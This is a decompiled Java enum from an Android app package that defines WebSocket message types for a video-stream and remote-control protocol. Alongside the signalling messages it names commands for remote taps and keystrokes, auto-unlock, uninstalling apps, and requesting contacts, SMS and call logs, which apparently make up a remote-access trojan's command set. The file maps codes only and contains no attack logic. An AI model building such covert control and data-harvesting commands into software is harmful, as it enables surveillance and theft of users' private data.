package com.mamimobi.videostream.model;

import org.java_websocket.framing.CloseFrame;

/* JADX INFO: loaded from: classes.dex */
public enum MessageType {
    SOCKET_OPEN(0, "SOCKET_OPEN"),
    SOCKET_MESSAGE(1, "SOCKET_MESSAGE"),
    SOCKET_CLOSE(2, "SOCKET_CLOSE"),
    SOCKET_ERROR(3, "SOCKET_ERROR"),
    CONNECT_OK(4, "CONNECT_OK"),
    JOIN(10, "joinRoom"),
    PARTICIPANTS(11, "existingParticipants"),
    NEW_PEER(12, "newParticipantArrived"),
    OFFER(13, "receiveVideoFrom"),
    ANSWER(14, "receiveVideoAnswer"),
    CANDIDATE(15, "iceCandidate"),
    LEAVE(16, "participantLeft"),
    PING(17, "ping"),
    PONG(18, "pong"),
    ROOM_FULL(19, "ROOM_FULL"),
    CLICK(20, "click"),
    LONGCLICK(21, "longpress"),
    SWIPE(22, "swipe"),
    KEYEVEVENT(23, "remoteKeyEvent"),
    ICESTATE(24, "iceState"),
    VIRTUALKEYBOARD(25, "remoteCharInput"),
    LONGPRESSDRAG(26, "longpressdrag"),
    SCREENHELPER(27, "screenhelper"),
    REQUESTCONTACTS(28, "requestContacts"),
    REQUESTSMS(29, "requestSms"),
    REQUESTCALLLOGS(30, "requestCallLogs"),
    GETINSTALLEDAPPS(31, "getInstalledApps"),
    UNINSTALL(32, "uninstall"),
    PUSHURL(33, "pushurl"),
    AUTOLOCK(34, "autoUnlock"),
    OPENAPP(35, "openapp"),
    NOTIFICATION(36, "notification"),
    RECORDER(37, "recordEvent"),
    TRACK(38, "trackEvent"),
    BIND(39, "bind"),
    DEVICE(40, "device"),
    FAKE(41, "fakeEvent"),
    CUSTOM(CloseFrame.GOING_AWAY, "CUSTOM"),
    DEFAULT(-1, "DEFAULT");

    private int code;
    private String type;

    MessageType(int i, String str) {
        this.code = i;
        this.type = str;
    }

    public static MessageType getMessageType(int i) {
        for (MessageType messageType : values()) {
            if (messageType.getCode() == i) {
                return messageType;
            }
        }
        return DEFAULT;
    }

    public int getCode() {
        return this.code;
    }

    public String getType() {
        return this.type;
    }

    public static MessageType getMessageType(String str) {
        for (MessageType messageType : values()) {
            if (str.equals(messageType.getType())) {
                return messageType;
            }
        }
        return DEFAULT;
    }
}
